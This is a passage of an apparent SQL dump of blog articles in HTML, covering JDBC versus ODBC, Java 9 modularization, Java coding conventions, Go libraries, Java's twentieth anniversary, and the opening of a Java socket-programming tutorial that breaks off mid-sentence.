style=\"font-size:18px\"><strong>JDBC完全遵循Java语言的优良特性。通常情况下，只要有Java功能需设计基础的用户都能在最短时间内了解JDBC驱动程序的架构，较量简易上手，能轻而易举的开发出强悍的数据库实际运用程序。而ODBC的话，由于其内部功能复杂，源代码编写要求高。为此即使是一个的C语言的高手，仍然需求花费不少的时间去了解那个数据库启动程序;在编写源代码的时间，还离不开有关的参考书本。</strong></span></span></p>\r\n\r\n<p><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:18px\"><strong>3.JDBC的移植性要比ODBC要好。</strong></span></span></p>\r\n\r\n<p><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:18px\"><strong>通常情况下，安装完ODBC驱动程序之后，还需求经过确定的配置才能够应用。而不相同的配置在不相同数据库服务器之间不能够通用。也那是说，装一次需求配置一次。但是JDBC数据库驱动程序则不相同。假如采用JDBC数据库驱动程序的话，则只需要选取适当的 JDBC数据库驱动程序，就不需要额外的配置。在安装过程中，JDBC数据库驱动程序会自己完成有关的配置。为此JDBC的移植性要比ODBC要好。</strong></span></span></p>\r\n\r\n<p><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:18px\"><strong>从ODBC向JDBC过度</strong></span></span></p>\r\n\r\n<p><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:18px\"><strong>也许数据库编程以前采用的是ODBC驱动程序，而假如数据库编程目前需要采用JDBC驱动程序，那么能否出现顺利过渡呢?答案是肯定的。在JDBC驱动程序中有一类叫作JDBC-ODBC桥接启动程序。这种类别的JDBC数据库驱动程序其底层是经过ODBC驱动程序来连接数据库的。假如原先的实际运用程序是基于ODBC数据库驱动程序的，或者数据库没有帮助对应的JDBC驱动程序，则数据库编程能利用JDBC-ODBC桥接驱动程序来实现。也那是说，桥接驱动程序能利用现有的ODBC驱动程序来存取联系型数据库。为此者不仅能保留先前的开发架构(经过ODBC来存取数据)，还能立即应用Java作为新的开发环境，从而出现ODBC数据库驱动程序到JDBC的顺利转型。</strong></span></span></p>\r\n\r\n<p><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:18px\"><strong>不过在采用这种桥接驱动程序的时间，需求留意几个难点。一是那个桥接驱动程序仍然需要用到ODBC数据库驱动程序。由于桥接驱动程序直接联系的对象是ODBC驱动程序，然后再经过ODBC驱动程序去访问数据库。为此在客户端必需先安装并配置好ODBC驱动程序。假如采用的是三层式的开发框架，也需求安装ODBC驱动程序。其次，在这种模式下，实际运用程序先调用JDBC，然后再经过JDBC调用ODBC，最后再跟数据库通信。显然其中间多了几个环节。由于其中间环节较量多，但数据访问出现难点的时候，就不太好查难点。这就好像一道水管，假如中间的接口多了的话，则除了漏水的几率就较量高。假如真的除了漏水的话，则查询漏水点的时间也会较量困难。为此笔者以为，采用桥接类别的JDBC驱动程序只是权宜之计。在适当的时间，数据库开发还是需要调整原先的开发架构，全部都转到JDBC驱动程序上来。桥接程序只是为数据库开发争取确定的时间。虽然那个转型过程中的阵痛是较痛的，但确是不可避免的。长痛不如短痛，笔者意见数据库开发还是及早停止过渡为好。并在估计的情况下，把以前的开发架构也停止调整，以采用真正意义上的JDBC驱动程序。</strong></span></span></p>\r\n\r\n<p><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:18px\"><strong>JDBC虽然在一定程度上比ODBC操作简单，容易理解。但是世间万物存在即有道理，并不是说JDBC好就所有的情况下都能使用JDBC，两者之间没有好坏之分，只是在特定的情况下能够选取合适的实现方式即可。参考文章http://blog.sina.com.cn/s/blog_4cf8aad30100lx47.html（貌似博主是翻译过来的，好多字词用得不太合适，理解起来有些困难，本人结合自己的认识做了替换）个人的一点点认识和整理，有不足之处请大家批评指正。</strong></span></span></p>\r\n',0,0,' Java系列之JDBC和ODBC之间的区别与联系',67,NULL,0),(12,0,'20150608082332',2,'<p>Java&#39;s chief architect emphasized the future in his EclipseCon keynote on Tuesday</p>\r\n\r\n<p>Java&#39;s chief architect, Mark Reinhold, emphasized the future in his EclipseCon keynote on Tuesday, unpacking both the near-term changes anticipated in Java 9 and updates that future releases could bring.</p>\r\n\r\n<p>Much of Reinhold&#39;s&nbsp;presentation&nbsp;focused on the concrete benefits of Java modularization. As reported by Alex Blewittfor InfoQ, Java 9 will modularize both the JVM&#39;s underlying architecture (and source code) and the individual Java components and runtime images. The Java platform will be reconfigured into a variety of modules, with<code>java.base</code>&nbsp;as the core dependency layer:</p>\r\n\r\n<blockquote>\r\n<p>Modules themselves can express dependencies between them, but packages are also exported from modules for the use of others. Due to internal implementation details, some packages (such as&nbsp;<code>sun.reflect.*</code>&nbsp;from the&nbsp;<code>java.base</code>&nbsp;module) are made available to friends (like&nbsp;<code>java.logging</code>&nbsp;and&nbsp;<code>java.sql</code>) although these won&#39;t be visible to normal Java code.</p>\r\n</blockquote>\r\n\r\n<p>Furthermore, &quot;[d]ependencies are transitive, so code that depends on&nbsp;<code>java.sql</code>&nbsp;will automatically inherit a dependency on&nbsp;<code>java.logging</code>, in the same way that Eclipse bundles using&nbsp;<code>Require-Bundle</code>&nbsp;operate.&quot;</p>\r\n\r\n<p>Reinhold noted that any discussion about changes after Java 9 is at this point &quot;highly speculative.&quot; Current trends and developments do, however, suggest a number of small language additions (such as value classes and enhanced generics for value types) that would support the ongoing evolution of Java. He also discussed the development and impact of&nbsp;Project Panama.</p>\r\n\r\n<p>Read more of this story&nbsp;on InfoQ&nbsp;...</p>\r\n\r\n<p>This story, &quot;Looking ahead: Life after Java 9&quot; was originally published by&nbsp;Java Everywhere.</p>\r\n',0,0,'Looking ahead: Life after Java 9',61,NULL,0),(13,0,'20150608082735',2,'<p><span style=\"font-size:18px\">NOTE：以下部分为一个简要的编码规范，更多规范请参考 ORACLE&nbsp;官方文档。</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;地址：http://www.oracle.com/technetwork/java/codeconventions-150003.pdf</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;另外，请使用 UTF-8&nbsp;格式来查看代码，避免出现中文乱码。</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;</span></p>\r\n\r\n<p><span style=\"font-size:18px\">至于注释应该使用中文还是英文，请自己行决定，根据公司或项目的要求而定，推荐使用英文。</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp; 1.&nbsp;整理代码</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1.1. Java&nbsp;代码中不允许出现在警告，无法消除的警告要用&nbsp;<strong>@SuppressWarnings</strong>。</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp; 1.2.&nbsp;去掉无用的包、方法、变量等，减少僵尸代码。</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp; 1.3.&nbsp;使用 Lint&nbsp;工具来查看并消除警告和错误。</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp; 1.4.&nbsp;使用&nbsp;<u>Ctrl</u>+Shift+F 来格式化代码，然后再进行调整。</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp; 1.5.&nbsp;使用&nbsp;<u>Ctrl</u>+Shift+O 来格式化 Import 包。</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp; 2.&nbsp;命名规则</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp; 2.1.&nbsp;基本原则&nbsp;</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.1.1.&nbsp;变量，方法，类命名要表义，严格禁止使用 name1, name2&nbsp;等命名。</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;2.1.2.&nbsp;命名不能太长，适当使用简写或缩写。（最好不要超过 25&nbsp;个字母）</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.1.3.&nbsp;方法名以小写字母开始，以后每个单词首字母大写。</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.1.4.&nbsp;避免使用相似或者仅在大小写上有区别的名字。</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.1.5.&nbsp;避免使用数字，但可用 2&nbsp;代替 to，用 4 代替 for 等，如go2Clean。&nbsp;&nbsp;</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp; 2.2.&nbsp;类、接口</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.2.1.&nbsp;所有单词首字母都大写。使用能确切反应该类、接口含义、功能等的词。一般采用名词。</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.2.2.&nbsp;接口带 I&nbsp;前缀，或able,&nbsp;<u>ible</u>,<u>er</u>等后缀。如ISeriable。</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp; 2.3.&nbsp;字段、常量</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.3.1.&nbsp;成员变量以 m&nbsp;开头，静态变量以 s 开头，如 mUserName, sInstance。</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.3.2.&nbsp;常量全部大写，在词与词之前用下划线连接，如 MAX_NUMBER。</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.3.3.&nbsp;代码中禁止使用硬编码，把一些数字或字符串定义成常用量。</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.3.4.&nbsp;对于废弃不用的函数，为了保持兼容性，通常添加&nbsp;<strong>@Deprecated</strong>，如&nbsp;{@link #doSomething()}</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp; 3.&nbsp;注释</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;请参考&nbsp;{@link #SampleCode}类的注释。</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp; 3.1.&nbsp;常量注释，参见&nbsp;{@link #ACTION_MAIN}</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp; 3.2.&nbsp;变量注释，参见&nbsp;{@link #mObject0}</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp; 3.3.&nbsp;函数注释，参见&nbsp;{@link #doSomething(<u>int</u>,float, String)}</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp; 4. Class&nbsp;内部顺序和逻辑</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp; 4.1.&nbsp;每个 class&nbsp;都应该按照一定的逻辑结构来排列基成员变量、方法、内部类等，</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从而达到良好的可读性。</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp; 4.2.&nbsp;总体上来说，要按照先 public,&nbsp;后protected, 最后 private, 函数的排布</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;也应该有一个逻辑的先后顺序，由重到轻。</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp; 4.3.&nbsp;以下顺序可供参考：</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;定义TAG，一般为 private（可选）</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;定义 public&nbsp;常量</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;定义 protected&nbsp;常量、内部类</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;定义 private&nbsp;变量</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;定义 public&nbsp;方法</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;定义 protected&nbsp;方法</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;定义 private&nbsp;方法</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp; 5.&nbsp;表达式与语句</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp; 5.1.&nbsp;基本原则：采用紧凑型风格来编写代码</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp; 5.2.&nbsp;细则</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;5.2.1.&nbsp;条件表示式，参见&nbsp;{@link #conditionFun(boolean)}</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5.2.2. switch&nbsp;语句，参见&nbsp;{@link #switchFun(<u>int</u>)}</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5.2.3.&nbsp;循环语句，参见&nbsp;{@link#circulationFun(boolean)}</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5.2.4.&nbsp;错误与异常，参见&nbsp;{@link #exceptionFun()}</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5.2.5.&nbsp;杂项，参见&nbsp;{@link #otherFun()}</span></p>\r\n\r\n<p><span style=\"font-size:18px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5.2.6.&nbsp;批注，参见&nbsp;{@link #doSomething(<u>int</u>,float, String)}</span></p>\r\n',0,0,'Java代码规范文档',62,NULL,0),(14,0,'20150608083125',2,'<ol>\r\n	<li>\r\n	<p>PostgreSQL链接库；</p>\r\n\r\n	<pre>\r\nhttps://github.com/bmizerany/pq</pre>\r\n	</li>\r\n	<li>\r\n	<p>MarkDown解析库</p>\r\n\r\n	<pre>\r\nhttps://github.com/russross/blackfriday</pre>\r\n	</li>\r\n	<li>\r\n	<p>Redis链接库</p>\r\n\r\n	<pre>\r\nhttps://github.com/alphazero/Go-Redis</pre>\r\n	</li>\r\n	<li>\r\n	<p>配置文件读取库</p>\r\n\r\n	<pre>\r\nhttps://github.com/jonsen/goconfig/config</pre>\r\n	</li>\r\n	<li>\r\n	<p>日志操作库</p>\r\n\r\n	<pre>\r\nhttps://github.com/cihub/seelog</pre>\r\n	</li>\r\n	<li>\r\n	<p>数据库ORM库</p>\r\n\r\n	<pre>\r\nhttps://github.com/astaxie/beedb</pre>\r\n\r\n	<pre>\r\n微信 https://github.com/astaxie/weixin <span style=\"background-color:rgb(255, 255, 255); font-family:helvetica,arial,freesans,clean,sans-serif; font-size:14.44444465637207px\">这个项目是基于beego开发的微信应用，主要实现了&ldquo;Go中国&rdquo;这个微信账号的自动恢复，能够同步读取gopkg这个开源库的内容</span><span style=\"background-color:transparent; color:inherit; font-size:12px\"> .</span></pre>\r\n\r\n	<pre>\r\n<span style=\"background-color:transparent; color:inherit; font-size:12px\">验证库 https://github.com/astaxie/beeku</span></pre>\r\n\r\n	<pre>\r\ndemo大全 https://github.com/astaxie/gopkg 持续更新</pre>\r\n\r\n	<pre>\r\nhttps://github.com/golangers/framework#readme \r\n     </pre>\r\n\r\n	<ul>\r\n		<li>WebServer服务</li>\r\n		<li>聊天室(chatroom)&nbsp;-&nbsp;在线demo</li>\r\n		<li>记事本(guestbook)&nbsp;-&nbsp;在线demo</li>\r\n		<li>Helloworld&nbsp;-&nbsp;在线demo</li>\r\n		<li>图片分享(pinterest)&nbsp;-&nbsp;在线demo</li>\r\n		<li>Golang Play&nbsp;-&nbsp;在线demo</li>\r\n		<li>Todo List&nbsp;-&nbsp;在线demo</li>\r\n		<li>权限管理(website-admin)&nbsp;-&nbsp;在线demo</li>\r\n	</ul>\r\n	</li>\r\n</ol>\r\n',0,0,'Golang开源库',89,NULL,0),(15,0,'20150608083722',2,'<p>Java synthesized sound ideas, repackaging them in a practical format that turned on a generation of coders</p>\r\n\r\n<p>Remembering what the programming world was like in 1995 is no easy task. Object-oriented programming, for one, was an accepted but seldom practiced paradigm, with much of what passed as so-called object-oriented programs being little more than rebranded C code that used&nbsp;<code>&gt;&gt;</code>&nbsp;instead of&nbsp;<code>printf</code>&nbsp;and&nbsp;<code>class</code>&nbsp;instead of&nbsp;<code>struct</code>. The programs we wrote those days routinely dumped core due to pointer arithmetic errors or ran out of memory due to leaks. Source code could barely be ported between different versions of Unix. Running the same binary on different processors and operating systems was crazy talk.</p>\r\n\r\n<p>Java changed all that. While platform-dependent, manually allocated, procedural C code will continue to be with us for the next 20 years at least, Java proved this was a choice, not a requirement. For the first time, we began writing real production code in a cross-platform, garbage-collected, object-oriented language; and we liked it ... millions of us. Languages that have come after Java, most notably C#, have had to clear the new higher bar for developer productivity that Java established.</p>\r\n\r\n<p>James Gosling, Mike Sheridan, Patrick Naughton, and the other programmers on Sun&rsquo;s Green Project did not invent most of the important technologies that Java brought into widespread use. Most of the key features they included in what was then known as Oak found its origins elsewhere:</p>\r\n\r\n<ul>\r\n	<li>A base Object class from which all classes descend? Smalltalk.</li>\r\n	<li>Strong static type-checking at compile time? Ada.</li>\r\n	<li>Multiple interface, single implementation inheritance? Objective-C.</li>\r\n	<li>Inline documentation? CWeb.</li>\r\n	<li>Cross-platform virtual machine and byte code with just-in-time compilation? Smalltalk again, especially Sun&rsquo;s Self dialect.</li>\r\n	<li>Garbage collection? Lisp.</li>\r\n	<li>Primitive types and control structures? C.</li>\r\n	<li>Dual type system with non-object primitive types for performance? C++.</li>\r\n</ul>\r\n\r\n<p>Java did, however, pioneer new territory. Nothing like checked exceptions is present in any other language before or since. Java was also the first language to use Unicode in the native string type and the source code itself.</p>\r\n\r\n<p>But Java&rsquo;s core strength was that it was built to be a practical tool for getting work done. It popularized good ideas from earlier languages by repackaging them in a format that was familiar to the average C coder, though (unlike C++ and Objective-C) Java was not a strict superset of C. Indeed it was precisely this willingness to not only add but also remove features that made Java so much simpler and easier to learn than other object-oriented C descendants.</p>\r\n\r\n<p>Java did not (and still does not) have&nbsp;<code>structs</code>,&nbsp;<code>unions</code>,&nbsp;<code>typedefs</code>, and&nbsp;<code>header</code>&nbsp;files. An object-oriented language not shackled by a requirement to run legacy code didn&rsquo;t need them. Similarly Java wisely omitted ideas that had been tried and found wanting in other languages: multiple implementation inheritance, pointer arithmetic, and operator overloading most noticeably. This good taste at the beginning means that even 20 years later, Java is still relatively free of the &ldquo;here be dragons&rdquo; warnings that litter the style guides for its predecessors.</p>\r\n\r\n<p>But the rest of the programming world has not stood still. Thousands of programming languages have risen since we first started programming Java, but most never achieved more than a minuscule fraction of collective attention before eventually disappearing. What sold us on Java were applets, small programs running inside of Web pages that could interact with the user and do more than display static text, pictures, and forms. Today, this doesn&rsquo;t sound like much, but remember -- in 1995, JavaScript and the DOM didn&rsquo;t exist, and an HTML form that talked to a server-side CGI script written in Perl was state of the art.</p>\r\n\r\n<p>The irony is that&nbsp;applets never worked very well. They were completely isolated from the content on the page, unable to read or write HTML as JavaScript eventually could. Security constraints prevented applets from interacting with the local file system and third-party network servers. These restrictions made applets suitable for little more than simple games and animations. Even these trivial proofs of concept were hampered by the poor performance of early browser virtual machines. And by the time applets&rsquo; deficiencies were corrected, browsers and front-end developers had long since passed Java by. Flash, JavaScript, and most recently HTML5 caught our eyes as far more effective platforms for delivering the dynamic Web content Java had promised us but failed to deliver.</p>\r\n\r\n<p>Still, applets were what inspired us to work with Java, and what we discovered was a clean language that smoothed out many of the rough edges and pain points we&rsquo;d been struggling with in alternatives such as C++. Automatic garbage collection alone was worth the price of admission. Applets may have been overhyped and underdelivered, but that didn&rsquo;t mean Java wasn&rsquo;t a damn good language for other problems.</p>\r\n\r\n<p>Originally intended as a cross-platform client library, Java found real success in the server space. Servlets, JavaServer Pages, and an array of enterprise-focused libraries that were periodically bundled together and rebranded in one confusing acronym or another solved real problems for us and for business. Marketing failures aside, Java achieved near-standard status in IT departments around the world. (Quick: What&rsquo;s the difference between Java 2 Enterprise Edition and Java Platform Enterprise Edition? If you guessed that J2EE is the successor of JEE, you got it exactly backward.) Some of these enterprise-focused products were on the heavyweight side and inspired open source alternatives and supplements such as Spring, Hibernate, and Tomcat, but these all built on top of the foundation Sun set.</p>\r\n\r\n<p>Arguably the single most important contribution of open source to Java and the wider craft of programming is JUnit.&nbsp;Test-driven development&nbsp;(TDD) had been tried earlier with Smalltalk. However, like many other innovations of that language, TDD did not achieve widespread notice and adoption until it became available in Java. When Kent Beck and Erich Gamma released JUnit in 2000, TDD rapidly ascended from an experimental practice of a few programmers to the standard way to develop software in the 21st century. As Martin Fowler has said, &quot;Never in the field of software development was so much owed by so many to so few lines of code,&quot; and those few lines of code were written in Java.</p>\r\n\r\n<p>Twenty years since its inception, Java is no longer the scrappy upstart. It has become the entrenched incumbent other languages rebel against. Lighter-weight languages like Ruby and Python have made significant inroads into Java&rsquo;s territory, especially in the startup community where speed of development counts for more than robustness and scale -- a trade-off that Java itself took advantage of in the early days when performance of virtual machines severely lagged compiled code.</p>\r\n\r\n<p>Java, of course, is not standing still. Oracle continues to incorporate well-proven technologies from other languages such as&nbsp;generics, autoboxing, enumerations, and, most recently,&nbsp;lambda expressions. Many programmers first encountered these ideas in Java. Not every programmer knows Java, but whether they know it or not, every programmer today has been influenced by it.</p>\r\n\r\n<p>This story, &quot;Java at 20: How it changed programming forever&quot; was originally published by&nbsp;InfoWorld.</p>\r\n\r\n<p>&nbsp;</p>\r\n',0,0,'Java at 20: How it changed programming forever',67,NULL,0),(16,0,'20150608084400',2,'<p>From simple I/O to non-blocking asynchronous channels in the Java socket model</p>\r\n\r\n<p>In the late nineties I was working for an online video game company where I spent my days writing Unix Berkley Sockets and Windows WinSock code. My task was to enable video game clients to communicate with a game server. When I had the opportunity to write some Java socket code, I was amazed by Java&#39;s streamlined and straightforward approach to network programming. This is no surprise because Java was originally designed to enable smart devices to communicate with one another, which translated very well to desktop and server applications.</p>\r\n\r\n<p>In 1996, JavaWorld published &quot;Sockets programming in Java: A tutorial.&quot; Written by Qusay H. Mahmoud, the article presents an overview of the Java model for socket programming. While a few things have changed in the 18 years since, Mahmoud&#39;s article is still a classic introduction to Java socket programming in networked systems. I&#39;ll build on that work here by first presenting a simple client-server example that demonstrates the humble beginnings of Java I/O. The example will demonstrate features from both the original&nbsp;<code>java.io</code>&nbsp;package and NIO, the new, non-blocking I/O (<code>java.nio</code>) APIs introduced in Java 1.4. My final example will leverage some of the NIO.2 features introduced in Java 7.</p>\r\n\r\n<p>Socket programming with Java: TCP and UDP</p>\r\n\r\n<p>Socket programming boils down to two systems communicating with one another. Network communication comes in two flavors: Transport Control Protocol (TCP) and User Datagram Protocol (UDP). TCP and UDP are used for different purposes and both have unique constraints:</p>\r\n\r\n<ul>\r\n	<li>TCP is relatively simple and reliable protocol that enables a client to make a connection to a server and the two systems to communicate. In TCP, each entity knows that its communication payloads have been received.</li>\r\n	<li>UDP is a&nbsp;<em>connectionless protocol</em>&nbsp;and is good for scenarios where you do not necessarily need every packet to arrive at its destination, such as media streaming.</li>\r\n</ul>\r\n\r\n<p>To appreciate the difference between TCP and UDP, consider what would happen if you were streaming video from your favorite website and it dropped frames. Would you prefer that the client slow down your movie to receive the missing frames or would you prefer that the video continue playing? Video streaming protocols typically leverage UDP. Because TCP guarantees delivery, it is the protocol of choice for HTTP, FTP, SMTP, POP3, and so forth.</p>\r\n\r\n<p>Old-school sockets</p>\r\n\r\n<p>In implementations prior to NIO, Java TCP client socket code is handled by the<code>java.net.Socket</code>&nbsp;class. The following code opens a connection to a server:</p>\r\n\r\n<pre style=\"margin-left:180px\">\r\n<span style=\"color:rgb(0, 0, 0)\">	</span><strong>Socket</strong><span style=\"color:rgb(0, 0, 0)\"> socket </span><span style=\"color:rgb(102, 102, 0)\">=</span><span style=\"color:rgb(0, 0, 0)\"> </span><strong>new</strong><span style=\"color:rgb(0, 0, 0)\"> </span><strong>Socket</strong><span style=\"color:rgb(102, 102, 0)\">(</span><span style=\"color:rgb(0, 0, 0)\"> server</span><span style=\"color:rgb(102, 102, 0)\">,</span><span style=\"color:rgb(0, 0, 0)\"> port </span><span style=\"color:rgb(102, 102, 0)\">);</span></pre>\r\n\r\n<p>Once our&nbsp;<code>socket</code>&nbsp;instance is connected to the server we can start obtaining input and output streams to the sever. Input streams are used to read data from the server while output streams are used to write data to the server. We can execute the following methods to obtain input and output streams:</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">	InputStream in = socket.getInputStream();\r\n	OutputStream out = socket.getOutputStream();</code></pre>\r\n\r\n<p>Because these are ordinary streams, the same streams that we would use to read from and write to a file, we can convert them to the form that best serves our use case. For example, we could wrap the&nbsp;<code>OutputStream</code>&nbsp;with a&nbsp;<code>PrintStream</code>&nbsp;so that we can easily write text with methods like&nbsp;<code>println()</code>. For another example, we could wrap the&nbsp;<code>InputStream</code>&nbsp;with a&nbsp;<code>BufferedReader</code>, via an&nbsp;<code>InputStreamReader</code>, in order to easily read text with methods like&nbsp;<code>readLine()</code>.</p>\r\n\r\n<p>Java I/O demo, Part 1: HTTP client</p>\r\n\r\n<p>Let&#39;s work through a short example that executes an HTTP GET against an HTTP server. HTTP is more sophisticated than our example permits, but we can write client code to handle the simplest case: request a resource from the server and the server returns the response and closes the stream. This case requires the following steps:</p>\r\n\r\n<ol>\r\n	<li>Create a socket to the web server listening on port 80.</li>\r\n	<li>Obtain a&nbsp;<code>PrintStream</code>&nbsp;to the server and send the request&nbsp;<code>GET PATH HTTP/1.0</code>, where&nbsp;<code>PATH</code>&nbsp;is the requested resource on the server. For example, if we wanted to open the root of a web site then the path would 